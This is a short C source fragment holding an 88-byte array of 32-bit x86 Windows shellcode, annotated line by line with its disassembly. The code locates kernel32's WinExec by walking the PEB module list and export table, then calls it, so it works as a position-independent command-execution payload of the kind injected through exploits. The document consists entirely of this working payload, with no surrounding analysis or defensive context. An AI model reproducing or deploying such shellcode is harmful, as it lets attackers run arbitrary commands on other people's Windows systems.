
#define EXEC_X86_SIZE 88

char EXEC_X86[] = {
  /* 0000 */ "\x60"                         /* pushad                          */
  /* 0001 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0003 */ "\x6a\x01"                     /* push 0x1                        */
  /* 0005 */ "\xeb\x4c"                     /* jmp 0x53                        */
  /* 0007 */ "\x64\x8b\x40\x30"             /* mov eax, [fs:eax+0x30]          */
  /* 000B */ "\x8b\x40\x0c"                 /* mov eax, [eax+0xc]              */
  /* 000E */ "\x8b\x78\x0c"                 /* mov edi, [eax+0xc]              */
  /* 0011 */ "\xeb\x02"                     /* jmp 0x15                        */
  /* 0013 */ "\x8b\x3f"                     /* mov edi, [edi]                  */
  /* 0015 */ "\x8b\x5f\x18"                 /* mov ebx, [edi+0x18]             */
  /* 0018 */ "\x8b\x43\x3c"                 /* mov eax, [ebx+0x3c]             */
  /* 001B */ "\x8b\x4c\x03\x78"             /* mov ecx, [ebx+eax+0x78]         */
  /* 001F */ "\xe3\xf2"                     /* jecxz 0x13                      */
  /* 0021 */ "\x8d\x74\x0b\x18"             /* lea esi, [ebx+ecx+0x18]         */
  /* 0025 */ "\xad"                         /* lodsd                           */
  /* 0026 */ "\x91"                         /* xchg ecx, eax                   */
  /* 0027 */ "\xe3\xea"                     /* jecxz 0x13                      */
  /* 0029 */ "\x57"                         /* push edi                        */
  /* 002A */ "\xad"                         /* lodsd                           */
  /* 002B */ "\x01\xd8"                     /* add eax, ebx                    */
  /* 002D */ "\x50"                         /* push eax                        */
  /* 002E */ "\xad"                         /* lodsd                           */
  /* 002F */ "\x01\xd8"                     /* add eax, ebx                    */
  /* 0031 */ "\x97"                         /* xchg edi, eax                   */
  /* 0032 */ "\xad"                         /* lodsd                           */
  /* 0033 */ "\x01\xd8"                     /* add eax, ebx                    */
  /* 0035 */ "\x50"                         /* push eax                        */
  /* 0036 */ "\x8b\x74\x8f\xfc"             /* mov esi, [edi+ecx*4-0x4]        */
  /* 003A */ "\x81\x3c\x1e\x57\x69\x6e\x45" /* cmp dword [esi+ebx], 0x456e6957 */
  /* 0041 */ "\xe0\xf3"                     /* loopne 0x36                     */
  /* 0043 */ "\x5a"                         /* pop edx                         */
  /* 0044 */ "\x5e"                         /* pop esi                         */
  /* 0045 */ "\x5f"                         /* pop edi                         */
  /* 0046 */ "\x75\xcb"                     /* jnz 0x13                        */
  /* 0048 */ "\x0f\xb7\x04\x4a"             /* movzx eax, word [edx+ecx*2]     */
  /* 004C */ "\x03\x1c\x86"                 /* add ebx, [esi+eax*4]            */
  /* 004F */ "\xff\xd3"                     /* call ebx                        */
  /* 0051 */ "\x61"                         /* popad                           */
  /* 0052 */ "\xc3"                         /* ret                             */
  /* 0053 */ "\xe8\xaf\xff\xff\xff"         /* call 0x7                        */
};